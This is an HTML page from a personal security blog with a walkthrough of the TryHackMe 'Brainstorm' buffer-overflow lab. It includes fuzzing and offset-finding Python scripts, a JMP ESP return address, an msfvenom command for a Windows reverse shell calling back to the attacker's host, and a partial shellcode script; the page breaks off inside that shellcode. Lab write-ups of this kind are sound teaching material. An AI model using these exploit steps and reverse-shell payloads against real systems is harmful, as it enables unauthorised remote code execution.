@@ -1,0 +1,371 @@
+<!doctype html><html lang=en>
+<head>
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta http-equiv=content-language content="en">
+<meta name=color-scheme content="light dark">
+<meta http-equiv=content-security-policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self'; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self'; img-src 'self'; object-src 'none'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/; script-src 'self' 'unsafe-inline' https://www.google-analytics.com; prefetch-src 'self'; connect-src 'self' https://www.google-analytics.com;">
+<meta name=author content="Kiel Vaughn">
+<meta name=description content="Brainstorm    Brainstorm is a medium rated buffer overflow box on Try Hack Me.
+Task 1 Hints  Have you started the machine? Have you enumerated ALL TCP ports?   Task 2 Hints  One of the services you uncovered can be logged into anonymously, have you found it?   Task 3 Hints  Follow the hints given in this task, if you are still unsure, The Cyber Mentor does a good hands on walkthrough of a similar box.">
+<meta name=keywords content="blog,cybersecurity,personal">
+<meta name=twitter:card content="summary">
+<meta name=twitter:title content="Brainstorm">
+<meta name=twitter:description content="Brainstorm    Brainstorm is a medium rated buffer overflow box on Try Hack Me.
+Task 1 Hints  Have you started the machine? Have you enumerated ALL TCP ports?   Task 2 Hints  One of the services you uncovered can be logged into anonymously, have you found it?   Task 3 Hints  Follow the hints given in this task, if you are still unsure, The Cyber Mentor does a good hands on walkthrough of a similar box.">
+<meta property="og:title" content="Brainstorm">
+<meta property="og:description" content="Brainstorm    Brainstorm is a medium rated buffer overflow box on Try Hack Me.
+Task 1 Hints  Have you started the machine? Have you enumerated ALL TCP ports?   Task 2 Hints  One of the services you uncovered can be logged into anonymously, have you found it?   Task 3 Hints  Follow the hints given in this task, if you are still unsure, The Cyber Mentor does a good hands on walkthrough of a similar box.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="http://www.kielvaughn.com/ctfs/2021-06-10-brainstorm/"><meta property="article:section" content="ctfs">
+<meta property="article:published_time" content="2021-06-10T00:00:00+00:00">
+<meta property="article:modified_time" content="2021-06-10T00:00:00+00:00">
+<title>
+Brainstorm · Kiel Vaughn, CISSP
+</title>
+<link rel=canonical href=http://www.kielvaughn.com/ctfs/2021-06-10-brainstorm/>
+<link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin>
+<link rel=stylesheet href=/css/coder.min.708686f8ab8176e91d44fcbe488a0fe0333b94f405cf18a52383d67ba22f0ccb.css integrity="sha256-cIaG+KuBdukdRPy+SIoP4DM7lPQFzxilI4PWe6IvDMs=" crossorigin=anonymous media=screen>
+<link rel=stylesheet href=/css/coder-dark.min.aa883b9ce35a8ff4a2a5008619005175e842bb18a8a9f9cc2bbcf44dab2d91fa.css integrity="sha256-qog7nONaj/SipQCGGQBRdehCuxioqfnMK7z0Tastkfo=" crossorigin=anonymous media=screen>
+<link rel=icon type=image/png href=/assets/img/cissp.ico sizes=32x32>
+<link rel=icon type=image/png href=/assets/img/cissp.ico sizes=16x16>
+<link rel=apple-touch-icon href=/assets/img/cissp.ico>
+<link rel=apple-touch-icon sizes=180x180 href=/assets/img/cissp.ico>
+<meta name=generator content="Hugo 0.88.1">
+</head>
+<body class="preload-transitions colorscheme-dark">
+<main class=wrapper>
+<nav class=navigation>
+<section class=container>
+<a class=navigation-title href=/>
+Kiel Vaughn, CISSP
+</a>
+<input type=checkbox id=menu-toggle>
+<label class="menu-button float-right" for=menu-toggle>
+<i class="fa fa-bars fa-fw" aria-hidden=true></i>
+</label>
+<ul class=navigation-list>
+<li class=navigation-item>
+<a class=navigation-link href=/whoami/>whoami</a>
+</li>
+<li class=navigation-item>
+<a class=navigation-link href=/certifications/>certifications</a>
+</li>
+<li class=navigation-item>
+<a class=navigation-link href=/posts/>blog</a>
+</li>
+<li class=navigation-item>
+<a class=navigation-link href=/ctfs/>vulnerable machine walkthroughs</a>
+</li>
+</ul>
+</section>
+</nav>
+<div class=content>
+<section class="container page">
+<article>
+<header>
+<h1 class=title>
+<a class=title-link href=http://www.kielvaughn.com/ctfs/2021-06-10-brainstorm/>
+Brainstorm
+</a>
+</h1>
+</header>
+<h1 id=brainstorm>
+Brainstorm
+<a class=heading-link href=#brainstorm>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h1>
+<p>Brainstorm is a medium rated buffer overflow box on <a href=https://tryhackme.com/room/brainstorm>Try Hack Me</a>.</p>
+<details><summary><strong>Task 1 Hints</strong></summary>
+<ul>
+<li>Have you started the machine?
+<li>Have you enumerated ALL TCP ports?
+</ul>
+</details>
+<details><summary><strong>Task 2 Hints</strong></summary>
+<ul>
+<li>One of the services you uncovered can be logged into anonymously, have you found it?
+</ul>
+</details>
+<details><summary><strong>Task 3 Hints</strong></summary>
+<ul>
+<li>Follow the hints given in this task, if you are still unsure, <a href=https://www.thecybermentor.com/buffer-overflows-made-easy> The Cyber Mentor</a> does a good hands on walkthrough of a similar box.
+</ul>
+</details>
+<h2 id=walkthrough>
+Walkthrough
+<a class=heading-link href=#walkthrough>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h2>
+<details><summary><strong>Full Walkthrough</strong></summary>
+<h3 id=task-1>
+Task 1
+<a class=heading-link href=#task-1>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h3>
+<h4 id=question-1>
+Question 1
+<a class=heading-link href=#question-1>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h4>
+<p>Just start the machine!</p>
+<h4 id=question-2>
+Question 2
+<a class=heading-link href=#question-2>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h4>
+<p><img src=/assets/img/Brainstorm1.png alt="Brainstorm Task 1 Question 2"></p>
+<p>There are several ways to answer this question, but one of the easiest is to use threader3000, as it will enumerate all TCP ports. This can be ran by running:</p>
+<p><strong><code>threader3000</code></strong></p>
+<p>and then entering the IP address of the vulnerable host when prompted.</p>
+<p><img src=/assets/img/Brainstorm2.png alt="Brainstorm threader3000"></p>
+<p>This will provide the answer to this question, which should be 3 ports, but for some reason the answer is <strong>6</strong>. I&rsquo;ve reviewed other walkthroughs to confirm, and it appears that everyone has the same 3 ports appear.</p>
+<h3 id=task-2>
+Task 2
+<a class=heading-link href=#task-2>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h3>
+<h4 id=question-1-1>
+Question 1
+<a class=heading-link href=#question-1-1>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h4>
+<p>Next, choose option 1 to run the suggested nmap scan. After a couple of minutes, you will see the following results:</p>
+<p><img src=/assets/img/Brainstorm3.png alt="Brainstorm Task 2 Question 1 nmap"></p>
+<p>You will see that there is an FTP server, RDP (3389) and a service named abyss on 9999. Let&rsquo;s look at the ftp server first and see if anonymous FTP access is available.</p>
+<p><img src=/assets/img/Brainstorm4.png alt="Brainstorm Anonymous FTP"></p>
+<p>Let&rsquo;s run</p>
+<p><strong><code>ls</code></strong></p>
+<p>and you will see a directory called chatserver, let&rsquo;s navigate to this directory with</p>
+<p><strong><code>cd chatserver</code></strong></p>
+<p>Let&rsquo;s run</p>
+<p><strong><code>ls</code></strong></p>
+<p>again, and you will see 2 files present: <strong>chatserver.exe</strong> and <strong>essfunc.dll</strong>. The answer to this question is the executable file, <strong>chatserver.exe.</strong></p>
+<h3 id=task-3>
+Task 3
+<a class=heading-link href=#task-3>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h3>
+<h4 id=question-1-2>
+Question 1
+<a class=heading-link href=#question-1-2>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h4>
+<p>There is no answer required for this question, just complete this task.</p>
+<h4 id=question-2-1>
+Question 2
+<a class=heading-link href=#question-2-1>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h4>
+<p>Now we need to move these files to a local Windows box to figure out how to overflow the buffer.</p>
+<p>Let&rsquo;s run</p>
+<p><strong><code>mget *</code></strong></p>
+<p>to download both of these files to our Kali box.</p>
+<p><img src=/assets/img/Brainstorm5.png alt="Brainstorm download FTP file"></p>
+<p>Move these over to a Windows box for analysis with Immunity Debugger installed. In my case, since I was RDPed into both boxes, let&rsquo;s copy both of these files by selecting them, right clicking, and selecting Copy.</p>
+<p><img src=/assets/img/Brainstorm6.png alt="Brainstorm Copy Files Kali Box"></p>
+<p>Next, on the Windows machine, paste the files (this should work if you allow copy/paste over RDP).</p>
+<p><img src=/assets/img/Brainstorm7.png alt="Brainstorm Paste to Windows system"></p>
+<p>Next, start the chatserver program and open Immunity Debugger. Once started, we need to attach Immunity Debugger to chatserver. This is done by pressing <strong>CTRL+F1</strong> and selecting that chatserver application.</p>
+<p><img src=/assets/img/Brainstorm8.png alt="Brainstorm Immunity Debugger Attach chatserver"></p>
+<p>Next, let&rsquo;s click on the red arrow to run Immunity Debugger.</p>
+<p><img src=/assets/img/Brainstorm9.png alt="Brainstorm run Immunity Debugger"></p>
+<p>You should see the program running in the bottom right hand corner. Next, on our Kali box, let&rsquo;s connect to our Windows box with netcat.</p>
+<p>This is done with:</p>
+<p><strong><code>nc &lt;windows ip> 9999</code></strong></p>
+<p><img src=/assets/img/Brainstorm10.png alt="Brainstorm nc chat server"></p>
+<p>Let&rsquo;s see if we can use a Python script to test the username section to see if it is vulnerable to a buffer overflow attack:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/python</span>
+
+<span style=color:#f92672>import</span> socket
+
+buff<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#34;A&#34;</span>]
+counter<span style=color:#f92672>=</span><span style=color:#ae81ff>100</span>
+
+<span style=color:#66d9ef>while</span> len(buff) <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>50</span>:
+    buff<span style=color:#f92672>.</span>append(<span style=color:#e6db74>&#34;A&#34;</span><span style=color:#f92672>*</span>counter)
+    counter<span style=color:#f92672>=</span>counter<span style=color:#f92672>+</span><span style=color:#ae81ff>200</span>
+
+<span style=color:#66d9ef>for</span> character <span style=color:#f92672>in</span> buff:
+    print(<span style=color:#e6db74>&#34;Fuzzing PASS with </span><span style=color:#e6db74>%s</span><span style=color:#e6db74> bytes&#34;</span>) <span style=color:#f92672>%</span> len(character)
+    s<span style=color:#f92672>=</span>socket<span style=color:#f92672>.</span>socket(socket<span style=color:#f92672>.</span>AF_INET, socket<span style=color:#f92672>.</span>SOCK_STREAM)
+    connect<span style=color:#f92672>=</span>s<span style=color:#f92672>.</span>connect((<span style=color:#e6db74>&#39;&lt;victim ip address&gt;&#39;</span>, <span style=color:#f92672>&lt;</span>victim port<span style=color:#f92672>&gt;</span>))
+    s<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>1024</span>)
+    s<span style=color:#f92672>.</span>send(<span style=color:#e6db74>&#39;USER test</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>&#39;</span>)
+    s<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>1024</span>)
+    s<span style=color:#f92672>.</span>send(<span style=color:#e6db74>&#39;PASS &#39;</span> <span style=color:#f92672>+</span> character <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>&#39;</span>)
+    s<span style=color:#f92672>.</span>send(<span style=color:#e6db74>&#39;QUIT</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>&#39;</span>)
+    s<span style=color:#f92672>.</span>close()
+</code></pre></div><p>This script will attempt to send 200 &ldquo;A"s and increase it by 200 each time until the chatserver crashes. With Immunity Debugger running on your Windows box attached to chatserver, let&rsquo;s start this script with:</p>
+<p><strong><code>python &lt;script name></code></strong></p>
+<p>It appears that it crashed around 2,300 bytes:</p>
+<p><img src=/assets/img/Brainstorm12.png alt="Brainstorm buffer overflow"></p>
+<p>Back in Immunity Debugger, you can see that the EIP and ESP have been overwritten with 41414141, which is the hex equivalent of AAAA.</p>
+<p><img src=/assets/img/Brainstorm13.png alt="Brainstorm overwrite EIP ESP"></p>
+<p>Let&rsquo;s now use Metasploit&rsquo;s pattern create utility to help us figure out exactly where this is crashing. Let&rsquo;s run the following command:</p>
+<p><strong><code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2300</code></strong></p>
+<p><img src=/assets/img/Brainstorm14.png alt="Brainstorm pattern_create.rb"></p>
+<p>Next, let&rsquo;s modify our script above to look like the following:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/python</span>
+<span style=color:#f92672>import</span> socket
+
+buff<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy&#34;</span>
+
+s<span style=color:#f92672>=</span>socket<span style=color:#f92672>.</span>socket(socket<span style=color:#f92672>.</span>AF_INET, socket<span style=color:#f92672>.</span>SOCK_STREAM)
+connect<span style=color:#f92672>=</span>s<span style=color:#f92672>.</span>connect((<span style=color:#e6db74>&#39;192.168.1.121&#39;</span>, <span style=color:#ae81ff>9999</span>))
+s<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>1024</span>)
+s<span style=color:#f92672>.</span>send(<span style=color:#e6db74>&#39;USER test</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>&#39;</span>)
+s<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>1024</span>)
+s<span style=color:#f92672>.</span>send(buff)
+s<span style=color:#f92672>.</span>send(<span style=color:#e6db74>&#39;QUIT</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>&#39;</span>)
+s<span style=color:#f92672>.</span>close()
+</code></pre></div><p>Next, restart the chatserver application, Immunity Debugger, and attach Immunity Debugger to chatserver and run this new script after. This should crash chatserver immediately. Let&rsquo;s make note of the value listed under EIP in Immunity Debugger.</p>
+<p><img src=/assets/img/Brainstorm15.png alt="Brainstorm EIP Value"></p>
+<p>Next, let&rsquo;s use Metasploit&rsquo;s pattern offset tool to find the exact match. This would be done with:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <span style=color:#ae81ff>2300</span> -q <span style=color:#ae81ff>31704330</span>
+</code></pre></div><p><img src=/assets/img/Brainstorm16.png alt="Brainstorm offset"></p>
+<p>This will provide the exact offset needed, which is 2012, and the answer to Question 2 (even though an answer is not required).</p>
+<h4 id=question-3>
+Question 3
+<a class=heading-link href=#question-3>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h4>
+<p>Question 3 gives you a hint to look at the DLL downloaded to see if there&rsquo;s a function that can be used for execution without any protection. Let&rsquo;s take a look at this with Immunity Debugger. Restart chatserver and Immunity Debugger, attach and run the app in Immunity Debugger also.</p>
+<p>Once done, run</p>
+<p><strong><code>!mona modules</code></strong></p>
+<p>in the bar at the bottom of Immunity Debugger.</p>
+<p><img src=/assets/img/Brainstorm17.png alt="Brainstorm Mona Modules"></p>
+<p>Next, let&rsquo;s run:</p>
+<p><strong><code>!mona find -s "\xff\xe4" -m essfunc.dll</code></strong></p>
+<p>in the bottom toolbar of Immunity Debugger. This is searching for the hex value of the JMP ESP (\xff\xe4) in the essfunc.dll file. This will allow us to jump to the ESP and execute our payload.</p>
+<p><img src=/assets/img/Brainstorm18.png alt="Brainstorm search for JMP ESP"></p>
+<p>After running this, make note of the first memory address highlighted above (625014df). This will be utilized for our exploit. Since this is a 32 bit application, we will need to use little endian when converting this to hex for our script. This would end up with \xdf\x14\x50\x62 inserted into our script. Next, let&rsquo;s make the following updates to our script:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/python</span>
+<span style=color:#f92672>import</span> socket
+
+buff<span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;A&#34;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>2012</span> <span style=color:#f92672>+</span>  <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xdf\x14\x50\x62</span><span style=color:#e6db74>&#34;</span>
+s<span style=color:#f92672>=</span>socket<span style=color:#f92672>.</span>socket(socket<span style=color:#f92672>.</span>AF_INET, socket<span style=color:#f92672>.</span>SOCK_STREAM)
+connect<span style=color:#f92672>=</span>s<span style=color:#f92672>.</span>connect((<span style=color:#e6db74>&#39;&lt;victim ip&gt;&#39;</span>, <span style=color:#f92672>&lt;</span>victim port<span style=color:#f92672>&gt;</span>))
+s<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>1024</span>)
+s<span style=color:#f92672>.</span>send(<span style=color:#e6db74>&#39;USER test</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>&#39;</span>)
+s<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>1024</span>)
+s<span style=color:#f92672>.</span>send(buff)
+s<span style=color:#f92672>.</span>send(<span style=color:#e6db74>&#39;QUIT</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>&#39;</span>)
+s<span style=color:#f92672>.</span>close()
+</code></pre></div><p>This script will send 2007 A&rsquo;s, which will get us to our offset for the buffer overflow, it will then send the value for the JMP ESP value. Let&rsquo;s save this script and restart chatserver, restart Immunity Debugger, attach chatserver, and click on run in Immunity Debugger. Next, click on the last icon before he letters in the Immunity Debugger toolbar.</p>
+<p><img src=/assets/img/Brainstorm19.png alt="Brainstorm Immunity Toolbar"></p>
+<p>Next enter the memory address (625014df) uncovered above.</p>
+<p><img src=/assets/img/Brainstorm20.png alt="Brainstorm jump to 62501df"></p>
+<p>Next, press <strong>F2</strong> to set a breakpoint here and ensure that running is showing in the lower right hand corner.</p>
+<p><img src=/assets/img/Brainstorm21.png alt="Brainstorm Immunity Debugger Breakpoint"></p>
+<p>Once this is set, run the script from our Kali box. Next, in Immunity, Debugger, you should see the JMP ESP value uncovered previously listed as the EIP value as shown below.</p>
+<p><img src=/assets/img/Brainstorm22.png alt="Brainstorm confirm JMP ESP Value"></p>
+<h4 id=question-4>
+Question 4
+<a class=heading-link href=#question-4>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h4>
+<p>This means that we can now create and insert a payload to exploit this box. Let&rsquo;s use msfvenom with the following command to create a payload to create a reverse shell:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;Kali IP Address&gt; LPORT=&lt;Port of your choice&gt; --platform windows -a x86 EXITFUNC=thread -b &#34;\x00&#34; -f python 
+</code></pre></div><p>This will create an x86 reverse TCP shell for Windows in Python code. You should see output similar to that shown below:</p>
+<p><img src=/assets/img/Brainstorm23.png alt="Brainstorm shellcode"></p>
+<p>Copy and paste the code above into your python script. Your new script should look like the following:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/python</span>
+
+<span style=color:#f92672>import</span> socket
+
+buf <span style=color:#f92672>=</span>  <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;&#34;</span>
+buf <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xd9\xee\xba\x0b\x1f\xb7\x9a\xd9\x74\x24\xf4\x58\x33</span><span style=color:#e6db74>&#34;</span>
+buf <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xc9\xb1\x52\x83\xe8\xfc\x31\x50\x13\x03\x5b\x0c\x55</span><span style=color:#e6db74>&#34;</span>
+buf <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x6f\xa7\xda\x1b\x90\x57\x1b\x7c\x18\xb2\x2a\xbc\x7e</span><span style=color:#e6db74>&#34;</span>
+buf <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xb7\x1d\x0c\xf4\x95\x91\xe7\x58\x0d\x21\x85\x74\x22</span><span style=color:#e6db74>&#34;</span>
+buf <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x82\x20\xa3\x0d\x13\x18\x97\x0c\x97\x63\xc4\xee\xa6</span><span style=color:#e6db74>&#34;</span>
+buf <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xab\x19\xef\xef\xd6\xd0\xbd\xb8\x9d\x47\x51\xcc\xe8</span><span style=color:#e6db74>&#34;</span>
+buf <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x5b\xda\x9e\xfd\xdb\x3f\x56\xff\xca\xee\xec\xa6\xcc</span><span style=color:#e6db74>&#34;</span>
+buf <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x11\x20\xd3\x44\x09\x25\xde\x1f\xa2\x9d\x94\xa1\x62</span><span style=color:#e6db74>&#34;</span>
+buf <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xec\x55\x0d\x4b\xc0\xa7\x4f\x8c\xe7\x57\x3a\xe4\x1b</span><span style=color:#e6db74>&#34;</span>
+buf <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xe5\x3d\x33\x61\x31\xcb\xa7\xc1\xb2\x6b\x03\xf3\x17</span><span style=color:#e6db74>&#34;</span>
+buf <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xed\xc0\xff\xdc\x79\x8e\xe3\xe3\xae\xa5\x18\x6f\x51</span><span style=color:#e6db74>&#34;</span>
+buf <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x69\xa9\x2b\x76\xad\xf1\xe8\x17\xf4\x5f\x5e\x27\xe6</span><span style=color:#e6db74>&#34;</span>
+buf <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x3f\x3f\x8d\x6d\xad\x54\xbc\x2c\xba\x99\x8d\xce\x3a</span><span style=color:#e6db74>&#34;</span>
+buf <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xb6\x86\xbd\x08\x19\x3d\x29\x21\xd2\x9b\xae\x46\xc9</span><span style=color:#e6db74>&#34;</span>
+buf <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x5c\x20\xb9\xf2\x9c\x69\x7e\xa6\xcc\x01\x57\xc7\x86</span><span style=color:#e6db74>&#34;</span>
+buf <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xd1\x58\x12\x08\x81\xf6\xcd\xe9\x71\xb7\xbd\x81\x9b</span><span style=color:#e6db74>&#34;</span>
